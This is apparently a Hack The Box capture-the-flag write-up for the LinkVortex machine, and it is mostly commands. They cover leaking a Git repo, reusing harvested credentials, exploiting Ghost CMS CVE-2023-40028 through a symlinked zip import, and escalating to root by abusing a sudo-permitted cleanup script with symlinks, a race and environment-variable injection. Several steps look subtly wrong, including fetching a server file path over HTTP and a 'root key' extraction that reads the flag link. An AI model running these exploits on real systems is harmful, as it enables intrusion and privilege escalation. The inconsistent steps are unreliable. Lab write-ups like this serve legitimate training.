## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- **Exploits Used:**  
  - Ghost CMS Git repo leak  
  - CVE‑2023‑40028 Ghost “symlink‑in‑zip” file‑read  
  - `clean_symlink.sh` sudo abuse (double‑symlink, TOCTOU, `$CHECK_CONTENT` injection)  

**Open Ports:**  
- SSH 22/tcp  
- HTTP 80/tcp  

**Tools:**  
nmap, ffuf, git‑dumper, curl, zip/unzip, Python 3 (requests, zipfile), sshpass  

---

## Recon 🔍  
```bash
# Scan all ports & services
nmap -p- --min-rate 10000 10.10.11.47
nmap -p 22,80 -sCV       10.10.11.47

# Host‑header fuzzing to find dev subdomain
ffuf -u http://10.10.11.47 -H "Host: FUZZ.linkvortex.htb" \
     -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

---

## Shell as bob 🐚  
1. **Dump the Git repo**  
   ```bash
   git-dumper http://dev.linkvortex.htb/.git/ source/
   ```
2. **Harvest creds**  
   - In `ghost/core/test/regression/api/admin/authentication.test.js`, password changed to `OctopiFociPilfer45`  
   - Login at `http://linkvortex.htb/ghost` with `admin@linkvortex.htb`  
3. **Exploit CVE‑2023‑40028**  
   ```bash
   # Craft ZIP with symlink:
   ln -s /etc/passwd content/images/evil.png
   zip -y -r poc.zip content/images/evil.png

   # Import via Ghost Admin API (use your session cookie)
   curl -F "importfile=@poc.zip" -b "ghost-admin-api-session=…" \
        http://linkvortex.htb/ghost/api/admin/db

   # Read file:
   curl http://linkvortex.htb/content/images/evil.png
   ```
4. **Extract bob’s SSH credentials**  
   ```bash
   curl -b "ghost-admin-api-session=…" \
        http://linkvortex.htb/var/lib/ghost/config.production.json \
     | jq '.mail.options.auth'
   # → "bob@linkvortex.htb" / "fibber-talented-worth"
   ```
5. **SSH as bob**  
   ```bash
   sshpass -p fibber-talented-worth ssh bob@linkvortex.htb
   cat user.txt
   ```

---

## Shell as root 👑  
1. **Check sudo rights**  
   ```bash
   sudo -l
   # NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
   ```
2. **Exploit `clean_symlink.sh`**  
   - **Double‑symlink**  
     ```bash
     ln -s /root/root.txt /home/bob/.cache/b
     ln -s /home/bob/.cache/b /home/bob/.cache/a.png
     CHECK_CONTENT=true sudo bash /opt/ghost/clean_symlink.sh /home/bob/.cache/a.png
     ```
   - **TOCTOU race**  
     ```bash
     while true; do ln -sf /root/root.txt /var/quarantined/x.png; done
     ln -s /some/other.png /dev/shm/x.png
     CHECK_CONTENT=true sudo bash /opt/ghost/clean_symlink.sh /dev/shm/x.png
     ```
   - **`$CHECK_CONTENT` injection**  
     ```bash
     ln -s dummy.png a.png
     CHECK_CONTENT=bash sudo bash /opt/ghost/clean_symlink.sh a.png
     # drops into a root shell
     ```
3. **SSH as root**  
   ```bash
   # Or extract root’s SSH key:
   CHECK_CONTENT=true sudo bash /opt/ghost/clean_symlink.sh /home/bob/.cache/a.png > root_key
   chmod 600 root_key
   ssh -i root_key root@linkvortex.htb
   cat root.txt
   ```

---

## Beyond Root 🔧  
- **Apache security hardening** in `/etc/apache2/sites-enabled/vhost.conf`:  
  ```apache
  ServerSignature Off
  ServerTokens Prod
  ```  
  Suppresses version info in `Server:` header and 404 footer.  

---

## Actions Learned 🎓  
- Host‑header subdomain discovery  
- Git repo enumeration & credential harvesting  
- Ghost CMS zip‑symlink file‑read (CVE‑2023‑40028)  
- Sudo script exploitation via symlink attacks & env injection  
- Apache `ServerTokens`/`ServerSignature` security directives  

---

## References 🔗  
- [CVE‑2023‑40028 Ghost symlink‑in‑zip vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2023-40028)  
- Ghost Admin API `/db` endpoint docs  
- Apache docs on `ServerTokens` & `ServerSignature`   